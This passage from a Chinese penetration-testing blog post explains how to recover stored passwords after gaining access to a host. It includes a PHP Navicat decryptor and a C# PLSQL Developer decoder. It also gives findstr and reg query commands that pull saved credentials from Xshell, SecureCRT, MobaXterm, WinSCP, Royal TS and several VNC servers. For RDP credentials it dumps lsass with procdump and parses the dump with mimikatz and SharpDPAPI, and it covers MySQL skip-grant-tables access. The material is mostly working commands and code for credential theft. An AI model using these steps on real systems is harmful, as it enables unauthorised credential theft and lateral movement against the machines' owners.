class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$temp</span> = <span class="keyword">$this</span>-&gt;encryptBlock(<span class="keyword">$this</span>-&gt;xorBytes(substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>), <span class="variable">$currentVector</span>));</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;xorBytes(<span class="variable">$currentVector</span>, <span class="variable">$temp</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;encryptBlock(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="keyword">$this</span>-&gt;xorBytes(substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> strtoupper(bin2hex(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> openssl_encrypt(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="keyword">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptBlock</span>(<span class="params"><span class="variable">$block</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> openssl_decrypt(<span class="variable">$block</span>, <span class="string">&#x27;BF-ECB&#x27;</span>, <span class="keyword">$this</span>-&gt;blowKey, OPENSSL_RAW_DATA|OPENSSL_NO_PADDING); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">xorBytes</span>(<span class="params"><span class="variable">$str1</span>, <span class="variable">$str2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str1</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$result</span> .= chr(ord(<span class="variable">$str1</span>[<span class="variable">$i</span>]) ^ ord(<span class="variable">$str2</span>[<span class="variable">$i</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptTwelve</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = openssl_encrypt(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="keyword">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="keyword">$this</span>-&gt;aesIv);</span><br><span class="line">        <span class="keyword">return</span> strtoupper(bin2hex(<span class="variable">$result</span>));</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;version) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;decryptEleven(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;decryptTwelve(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptEleven</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = hex2bin(strtolower(<span class="variable">$upperString</span>));</span><br><span class="line">        <span class="variable">$round</span> = intval(floor(strlen(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = strlen(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;blowIv;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$encryptedBlock</span> = substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="variable">$temp</span> = <span class="keyword">$this</span>-&gt;xorBytes(<span class="keyword">$this</span>-&gt;decryptBlock(<span class="variable">$encryptedBlock</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;xorBytes(<span class="variable">$currentVector</span>, <span class="variable">$encryptedBlock</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="keyword">$this</span>-&gt;encryptBlock(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="keyword">$this</span>-&gt;xorBytes(substr(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptTwelve</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = hex2bin(strtolower(<span class="variable">$upperString</span>));</span><br><span class="line">        <span class="keyword">return</span> openssl_decrypt(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="keyword">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="keyword">$this</span>-&gt;aesIv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//需要指定版本，11或12</span></span><br><span class="line"><span class="comment">//$navicatPassword = new NavicatPassword(12);</span></span><br><span class="line"><span class="variable">$navicatPassword</span> = <span class="keyword">new</span> NavicatPassword(<span class="number">11</span>);</span><br><span class="line"><span class="comment">//解密，15057D7BA390=密码</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$decode</span> = <span class="variable">$navicatPassword</span>-&gt;decrypt(trim(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decode</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Mysql-离线本地解析"><a href="#Mysql-离线本地解析" class="headerlink" title="Mysql 离线本地解析"></a>Mysql 离线本地解析</h2><p>条件：需mysql5.0版本<br>1、将目标Mysql data目录下的user.frm ,user.MYD ,user.MYI 文件托回来<br>2、本地安装MySQL Server，装完之后立即停掉服务，将拖回来的那三个文件分别丢到 C:\Program Files\MySQL\MySQL Server\data\mysql 目录下进行替换<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16193355710487.jpg" alt="-w605"></p>
+<p>3、修改Mysql服务配置文件<br>C:\Program Files\MySQL\MySQL Server\my.ini<br>在mysqld配置项下添加如下配置，之后启动 Mysql服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skip-grant-tables</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190931382803.jpg" alt="-w744"><br>4、无需密码直接登录mysql执行,即可拿到完整的密码hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select user,password,host from mysql.user;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194167134693.jpg" alt="-w565"><br>解密hash*A6FC877475CA625B65AD5C01F3C23EBE034B1D0B<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194167998608.jpg" alt="-w656"></p>
+<h2 id="PLSQL-Developer离线解密"><a href="#PLSQL-Developer离线解密" class="headerlink" title="PLSQL Developer离线解密"></a>PLSQL Developer离线解密</h2><p>PL/SQL Developer，一个用于在Oracle数据库环境中开发软件的集成开发环境，专注于PL/SQL存储程序单元的开发。<br>一、PLSQL Developer默认连接账密保存位置位于当前用户如下路径的user.prefs文件中，账号和密码的加密方式比较简单，只是简单异或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\tale\AppData\Roaming\PLSQL Developer\Preferences\&lt;username&gt;\</span><br><span class="line">C:\Program Files\PLSQL Developer\Preferences\&lt;username&gt;\</span><br><span class="line">C:\Program Files (x86)\PLSQL Developer\Preferences\tale\</span><br></pre></td></tr></table></figure>
+
+<p>二、user.prefs文件需关注LogonHistory和CurrentConnections下的内容，此处的每一行都代表一条单独的连接记录<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16190939628834.jpg" alt="-w1140"><br>实质保存的就是以下内容进行的加密<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194208178640.jpg" alt="-w824"><br>三、将LogonHistoryCurrentConnections下的内容原样粘回本地，在代码中替换，解密即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic; using System.IO;</span><br><span class="line">public class Program</span><br><span class="line">&#123;</span><br><span class="line">public static void Main() &#123;</span><br><span class="line">var values = new List&lt;int&gt;(); var ret = string.Empty;</span><br><span class="line">string scrambled = &quot;543498649004974360845304780507850564970477235823608363436450624608495449804532495246743932415040964234454844624006&quot;; for (var i = 0; i &lt; scrambled.Length; i += 4)</span><br><span class="line">&#123;</span><br><span class="line">values.Add(Convert.ToInt32(scrambled.Substring(i, 4))); &#125;</span><br><span class="line">var key = values[0]; values.RemoveAt(0);</span><br><span class="line">for (var i = 0; i &lt; values.Count; i++) &#123;</span><br><span class="line">var val = values[i] - 1000;</span><br><span class="line"></span><br><span class="line">var mask = key + (10 * (i + 1));</span><br><span class="line">ret += (char)((val ^ mask) &gt;&gt; 4); &#125;</span><br><span class="line">Console.WriteLine(ret); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194214790655.jpg" alt="-w473"></p>
+<h2 id="Xshell、Xftp离线解密"><a href="#Xshell、Xftp离线解密" class="headerlink" title="Xshell、Xftp离线解密"></a>Xshell、Xftp离线解密</h2><p>Xshell和Xftp中保存的连接账号密码都默认放在了本地的配置文件中加密存放。<br>以Xshell为例，Xftp的解密过程相同<br>一、首先，切到xshell安装用户下，定位文件路径，针对不同版本的产品，连接会话文件的默认存放位置稍有不同<br>4.x以下的版本，基本放在了当前用户数据目录下的NetSarang目录中，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># dir %appdata%</span><br></pre></td></tr></table></figure>
+
+<p>5.x之后的版本，默认放在了当前用户的Documents目录下的NetSarang 目录中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># dir &quot;%userprofile%\Documents\NetSarang\Xshell\Sessions&quot; # dir &quot;%userprofile%\Documents\NetSarang\Xftp\Sessions&quot;</span><br></pre></td></tr></table></figure>
+
+<p>6.x之后的版本，放在了当前用户的Documents目录下，目录改了名叫 “NetSarang Computer”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># dir &quot;%userprofile%\Documents&quot;</span><br><span class="line"># dir &quot;%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions&quot; </span><br><span class="line"># dir &quot;%userprofile%\Documents\NetSarang Computer\6\Xftp\Sessions&quot;</span><br></pre></td></tr></table></figure>
+
+<p>二、 然后批量提取所有会话文件中的连接ip，端口，账号，密码hash，另外还有当前用户名以及当前用户的sid<br>注：5.0以下的版本无需用户名和sid<br>4.x 以下版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cd C:\Users\tale\AppData\Roaming\NetSarang\Xshell\Sessions</span><br><span class="line"># type *.xsh | findstr /c:&quot;Host=&quot; /c:&quot;Port=&quot; /c:&quot;Protocol=&quot; /c:&quot;UserName=&quot; /c:&quot;Password=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>5.x 版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cd C:\Users\tale\Documents\NetSarang\Xshell\Sessions</span><br><span class="line"># type *.xsh | findstr /c:&quot;Host=&quot; /c:&quot;Port=&quot; /c:&quot;Version=&quot; /c:&quot;UserName=&quot; /c:&quot;Password=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>6.x 版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cd C:\Users\tale\Documents\NetSarang Computer\6\Xshell\Sessions</span><br><span class="line"># type *.xsh | findstr /c:&quot;Host=&quot; /c:&quot;Port=&quot; /c:&quot;Version=&quot; /c:&quot;UserName=&quot; /c:&quot;Password=&quot;</span><br></pre></td></tr></table></figure>
+
+<p>三、将获取的信息粘回本地解密<br>4.x 解密<br>c:\Python38\python.exe XShellCryptoHelper.py -d -ver 5.0 yq6eVPz4qERzkwXXX==<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194217004652.jpg" alt="-w533"><br>5.x 解密<br>c:\Python38\python.exe XShellCryptoHelper.py -d -ver 5.1 -user majun -sid S-1-5-21-2822152782-4156995639-893189310-1000 JepcR/nMFLmM8gNFXXX<em><strong>*</strong></em><br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194217440891.jpg" alt="-w536"><br>6.x 解密<br>c:\Python38\python.exe XShellCryptoHelper.py -d -ver 6.0 -user WangJuan -sid S-1-5-21-2637387663-1902877020-2618282464-XXX uX/QNt0PwbZ7rwNFBISFDEoKsXXX*****<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16194217977249.jpg" alt="-w537"></p>
+<h2 id="SecureCRT-离线解密"><a href="#SecureCRT-离线解密" class="headerlink" title="SecureCRT 离线解密"></a>SecureCRT 离线解密</h2><p>一、切到指定用户权限下，默认都存放在当前用户数据目录下的Config目录下的Sessions目录中，以.ini命名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># dir %APPDATA%\VanDyke\Config\Sessions</span><br><span class="line"># cd C:\Users\tale\AppData\Roaming\VanDyke\Config\Sessions</span><br></pre></td></tr></table></figure>
+
+<p>二、批量提取所有会话文件中的连接IP、端口、账号及密码hash如下：<br>以8.0版本为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># findstr /si /c:&quot;Hostname&quot; /c:&quot;\&quot;Username\&quot;=&quot; /c:&quot;\&quot;Password V2\&quot;=&quot; /c:&quot;\&quot;[SSH2] Port\&quot;=&quot; *.ini</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16200464706398.jpg" alt="-w665"><br>三、最后把密码hash粘回本地解密即可<br>8.0版本解密 (不带前面三位 “02:”)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\Python38\python.exe SecureCRTCipher.py dec -v2 894b1f88420e3d9cfa89a7a06ab18d8e9e3ded949bdfgb1**</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16200879334942.jpg" alt="-w682"></p>
+<h2 id="Mobaxterm-离线解密"><a href="#Mobaxterm-离线解密" class="headerlink" title="Mobaxterm 离线解密"></a>Mobaxterm 离线解密</h2><p>该软件连接信息默认全部加密存于注册表内。<br>一、第一种方式，无管理密码的解密，从注册表中读取连接信息和账密hash，测试MobaXterm版本为12.0 ，该版本不会强制为连接设置管理密码<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16200880438005.jpg" alt="-w675"><br>然后带上目标机器名和MobaXterm的安装用户进行hash本地解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\Python38\python.exe MobaXtermCipher.py dec -sysh tale -sysu administrator -h 192.168.0.1 -u root +ARTYMdvHihPWokIa5KdDcjfIjb7pV1SFQD***</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16200881603120.jpg" alt="-w681"><br>二、第二种方式，带管理密码的解密<br>此处测试的MobaXterm为20.0，该版本每次连接都会强制你设置管理密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> # reg query HKEY_CURRENT_USER\Software\Mobatek\MobaXterm\P</span><br><span class="line">c:\Python38\python.exe MobaXtermCipher.py dec -p admin ehx0N63ueLNPkw==</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16200882731081.jpg" alt="-w569"><br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16200883055209.jpg" alt="-w678"></p>
+<h2 id="WinSCP-离线解密"><a href="#WinSCP-离线解密" class="headerlink" title="WinSCP 离线解密"></a>WinSCP 离线解密</h2><p>一、WinSCP账号密码保存位置<br>默认是直接加密保存在注册表中的，当然也不排除部分管理员把它保存在WinSCP.ini配置文件中，实际中如果注册表里确实查不到东西，最好先去桌面看下工具里的选项设置是存到哪里了<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202690577290.jpg" alt="-w1056"><br>二、切到指定用户权限下，查询注册表中保存的连接账密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query x64 HKCU\Software\Martin Prikryl\WinSCP 2\Sessions</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202711190909.jpg" alt="-w1056"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query x64 HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\root@45.32.61.129</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202712078875.jpg" alt="-w1045"></p>
+<p>三、将上面的 hash 粘回本地解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># winscppwd.exe root 192.168.159.206 A35C4158201A0C7D2E3333286D656E726D6A64726D6965726E6C6A3D383135327D1C7F68691B58A20B8CEB61AC622D00A585</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202712668116.jpg" alt="-w644"><br>四、关于配置文件的解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir %appdata%</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202715317978.jpg" alt="-w526"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># winscppwd.exe WinSCP.ini</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202715101016.jpg" alt="-w665"></p>
+<h2 id="Royal-TS-离线解密"><a href="#Royal-TS-离线解密" class="headerlink" title="Royal TS 离线解密"></a>Royal TS 离线解密</h2><p>切换到指定用户权限下，之后全盘搜”.rtsz” 文件，从中提取IP，账号，hash，以最新版Royal TS为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># cd c:\</span><br><span class="line"># dir /b /s *.rtsz</span><br><span class="line"># type C:\Users\Public\Documents\First.rtsz | findstr /c:&quot;CredentialOmitDomain&quot; /c:&quot;CredentialUsername&quot; /c:&quot;CredentialPassword&quot; /c:&quot;URI&quot;</span><br></pre></td></tr></table></figure>
+
+<p>把 hash 粘回本地解密即可，如果 “.rtsz” 文件加了管理密码，则需要先知道管理密码才能解密<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202801240366.jpg" alt="-w678"></p>
+<h2 id="VNC-Server-离线解密"><a href="#VNC-Server-离线解密" class="headerlink" title="VNC Server 离线解密"></a>VNC Server 离线解密</h2><p>一、UltraVNC Server 解密<br>全盘搜ultravnc.ini配置文件，密码加密保存在内</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># dir c:\*vnc.ini /s /b</span><br><span class="line"># type &quot;c:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini&quot; | findstr /c:&quot;pass&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202808710763.jpg" alt="-w647"><br>二、TightVNC Server 解密<br>TightVNC的账密配置信息存在注册表里内</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># reg query HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server /v ControlPassword </span><br><span class="line"># reg query HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server /v password</span><br><span class="line"># reg query HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server /v RfbPort</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202809315181.jpg" alt="-w678"><br>工具解密：<br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202808710763.jpg" alt="-w647"><br>三、 TigerVNC Server解密<br>TigerVNC Server的相关账密信息也存放在注册表中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># reg query HKEY_CURRENT_USER\SOFTWARE\TigerVNC\WinVNC4 /v &quot;password&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202813515492.jpg" alt="-w673"><br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202813735710.jpg" alt="-w682"><br>四、RealVNC Server解密<br>RealVNC Server的相关账密信息也存放在注册表中，但是需要管理权限才能读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver /v password\</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202814043261.jpg" alt="-w675"><br><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202813735710.jpg" alt="-w682"></p>
+<h2 id="Windows-RDP凭据管理解密"><a href="#Windows-RDP凭据管理解密" class="headerlink" title="Windows RDP凭据管理解密"></a>Windows RDP凭据管理解密</h2><p>一、先切到指定用户权限下，执行如下命令查看目标Windows凭据管理器中是否保存有各种系统连接账密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># cmdkey /l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202819782680.jpg" alt="-w421"></p>
+<p>二、查看凭据文件并尝试dump目标系统lsass.exe进程数据，<br>注：某些杀软目前会拦截此操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># whoami /user</span><br><span class="line"># dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br><span class="line"># procdump64.exe -accepteula -ma lsass.exe c:\users\public\documents\lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202850148353.jpg" alt="-w645"><br>三、将Dump的文件托回本地，离线解析获取当前用户的GUID和sha1 hash，后续需要利用该值解密数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># mimikatz.exe &quot;privilege::debug&quot; &quot;log master.lgos&quot; &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::dpapi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202824848645.jpg" alt="-w639"><br>四、之后使用SharpDPAPI.exe利用上面的hash进行解密<br>解密保存在目标本地的Rdp连接账密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># SharpDPAPI.exe credentials &#123;a4294d6d-1baa-45fb-a5f3-aaa57e3fc69e&#125;:0d6323ac1fa3da97a7b1914440cbd1dde5386935</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tale-1259367723.cos.ap-beijing.myqcloud.com/2021/05/06/16202832950917.jpg" alt="-w642"></p>
+<h2 id="FinalShell"><a href="#FinalShell" class="headerlink" title="FinalShell"></a>FinalShell</h2><p>FinalShell是一体化的的服务器,网络管理软件,不仅是ssh客户端,还是功能强大的开发,运维工具,充分满足开发,运维需求</p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_png/SE49V9dKJrwwpeS8AyNibs8Kf9RH3jvZDaG8I9jjWudVHJ5dthZ8Sp569EibDl74B8HgIwl6AuzaHf93ibBWV6U9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
+<p>连接信息存储在C:\Users\oneseven\AppData\Local\finalshell\conn\目录下 有多少条连接就会有多少个xxx_connect_config.json文件</p>
